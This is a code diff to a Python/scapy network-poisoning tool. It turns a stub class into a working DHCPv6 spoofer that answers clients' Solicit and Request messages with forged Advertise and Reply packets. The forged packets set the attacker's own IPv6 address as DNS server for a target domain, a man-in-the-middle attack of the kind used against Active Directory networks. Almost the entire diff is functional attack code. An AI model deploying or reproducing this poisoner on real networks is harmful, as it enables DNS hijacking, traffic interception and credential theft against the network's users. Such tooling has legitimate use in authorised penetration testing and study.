@@ -10,10 +10,16 @@ from scapy.all import (
     IPv6,
     DHCP6_Advertise,
     DHCP6_Solicit,
-    DHCP6_OptClientId,
+    DHCP6OptDNSServers,
+    DHCP6OptDNSDomains,
+    DHCP6OptIA_NA,
+    DHCP6OptIAAddress,
+    DHCP6_Request,
+    DHCP6_Reply,
+    DHCP6OptServerId,
+    DHCP6OptClientId,
 )
 from loguru import logger
-from threading import Thread
 from colorama import Fore, Style
 from .poisonnetwork import PoisonNetwork
 
@@ -26,6 +32,7 @@ class DHCP6(PoisonNetwork):
         mac_address (str): [ mac of the attacker ]
         iface (str): [ interface of the current subnet used ]
         info_logger (logger): [ Logger for the output ]
+        domain (str): [Target domain]
         level (logger): [ Logger level to display information ]
     """
 
@@ -36,38 +43,63 @@ class DHCP6(PoisonNetwork):
         mac_address: str,
         iface: str,
         info_logger: logger,
+        domain: str,
         level: str = "INFO",
     ):
         super().__init__(ip, ipv6, mac_address, iface, info_logger, level)
+        self.__domain = domain + "."
 
-    def __advertise_packet(self, pkt: packet, response: packet):
-        response /= DHCP6_Advertise(trid=pkt[DHCP6_Solicit].trid)
-        response /= DHCP6_OptClientId(
-            optlen=pkt[DHCP6_Solicit].optlen, duid=pkt[DHCP6_Solicit].duid
+    def __generate_ipv6_address(self) -> DHCP6OptIAAddress:
+        return DHCP6OptIAAddress(
+            optlen=24, addr="fe80::8577:1", preflft=300, validlft=300
         )
-        pass
+
+    def __advertise_packet(self, pkt: packet, response: packet) -> packet:
+        response /= DHCP6_Advertise(trid=pkt[DHCP6_Solicit].trid)
+
+        response /= DHCP6OptClientId(duid=pkt[DHCP6_Solicit].duid)
+        response /= DHCP6OptServerId(duid=pkt[DHCP6_Solicit].duid)
+        response /= DHCP6OptDNSServers(dnsservers=[self.ipv6])
+        response /= DHCP6OptDNSDomains(dnsdomains=[self.__domain])
+        response /= DHCP6OptIA_NA(
+            iaid=pkt[DHCP6OptIA_NA].iaid,
+            T1=200,
+            T2=250,
+            ianaopts=self.__generate_ipv6_address(),
+        )
+        return response
+
+    def __reply_packet(self, pkt: packet, response: packet) -> packet:
+        response /= DHCP6_Reply(trid=pkt[DHCP6_Request].trid)
+        response /= DHCP6OptServerId(duid=pkt[DHCP6_Request].duid)
+        response /= DHCP6OptClientId(duid=pkt[DHCP6_Request].duid)
+        response /= DHCP6OptDNSServers(dnsservers=[self.ipv6])
+        response /= DHCP6OptDNSDomains(dnsdomains=[self.__domain])
+        response /= DHCP6OptIA_NA(
+            iaid=pkt[DHCP6OptIA_NA].iaid,
+            T1=200,
+            T2=250,
+            ianaopts=self.__generate_ipv6_address(),
+        )
+        return response
 
     def __transport_layer(self, response: packet) -> packet:
-        response /= UDP(sport="547", dport="546")
+        response /= UDP(sport=547, dport=546)
         return response
 
     def __application_layer(self, pkt: packet, response: packet) -> packet:
-        response /= DNS(
-            id=pkt[DNS].id,
-            qr=1,
-            opcode="QUERY",
-            aa=1,
-            rd=0,
-            rcode="ok",
-            qdcount=0,
-            ancount=1,
-            nscount=0,
-            arcount=0,
-            qd=None,
-            an=self.__dns_resource_record(pkt),
-            ns=None,
-            ar=None,
-        )
+        if pkt.haslayer(DHCP6_Solicit):
+            self.info_logger.log(
+                self.logger_level,
+                f"{Fore.CYAN}(DHCP6)Capturing SOLICIT packet from {pkt[IPv6].src}{Style.RESET_ALL}",
+            )
+            response = self.__advertise_packet(pkt, response)
+        if pkt.haslayer(DHCP6_Request):
+            self.info_logger.log(
+                self.logger_level,
+                f"{Fore.CYAN}(DHCP6)Capturing REQUEST packet from {pkt[IPv6].src}{Style.RESET_ALL}",
+            )
+            response = self.__reply_packet(pkt, response)
         return response
 
     def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
@@ -80,14 +112,21 @@ class DHCP6(PoisonNetwork):
         self.info_logger.debug("Packet crafted: ")
         self.info_logger.debug(response.summary())
         if ip_of_the_packet not in self.targets_used:
-            self.info_logger.log(
-                self.logger_level,
-                f"{Fore.CYAN}(MDNS) Sending packet to {ip_of_the_packet}{Style.RESET_ALL}",
-            )
+            if response.haslayer(DHCP6_Advertise):
+                self.info_logger.log(
+                    self.logger_level,
+                    f"{Fore.CYAN}(DHCP6) Sending dhcp6 ADVERTISE packet to {ip_of_the_packet}{Style.RESET_ALL}",
+                )
+            else:
+                self.info_logger.log(
+                    self.logger_level,
+                    f"{Fore.CYAN}(DHCP6) Sending dhcp6 REPLY packet to {ip_of_the_packet}{Style.RESET_ALL}",
+                )
+
             sendp(response, verbose=False)
             self.targets_used.append(ip_of_the_packet)
 
-    def __filter_for_mdns(self, pkt: packet) -> bool:
+    def __filter_for_dhcp6(self, pkt: packet) -> bool:
         """[ Filter by sniffed packets of interest ]
 
         Args:
@@ -96,7 +135,11 @@ class DHCP6(PoisonNetwork):
         Returns:
             bool: [ If the packet is asking for a resource ]
         """
-        return pkt.haslayer(IPv6) and pkt[IPv6].dst == "ff02::12"
+        return (
+            pkt.haslayer(IPv6)
+            and pkt[IPv6].dst == "ff02::1:2"
+            and (pkt.haslayer(DHCP6_Request) or pkt.haslayer(DHCP6_Solicit))
+        )
 
     def __craft_malicious_packets(self, pkt: packet) -> None:
         """[ Function to craft a malicious packet ]
@@ -104,19 +147,21 @@ class DHCP6(PoisonNetwork):
         Args:
             pkt (packet): [ Sniffed packet ]
         """
-        if self.__filter_for_mdns(pkt):
+        if self.__filter_for_dhcp6(pkt):
             response = self._data_link_layer(pkt)
             response, ip_of_the_packet = self._network_layer(pkt, response)
             response = self.__transport_layer(response)
             response = self.__application_layer(pkt, response)
             self.__send_packet(response, ip_of_the_packet)
 
-    def start_mdns_poisoning(self) -> None:
+    def start_dhcp6_poisoning(self) -> None:
         """[ Function to start the poisoner ]"""
-        self.info_logger.log(self.logger_level, "Starting mdns poisoning...")
+        self.info_logger.log(
+            self.logger_level, f"Starting dhcp6 poisoning to attack {self.__domain}"
+        )
         self._start_cleaner()
         sniff(
-            filter="udp and (port 546 or port 547)",
+            filter="udp and port 547",
             iface=self.iface,
             prn=self.__craft_malicious_packets,
             store=0,
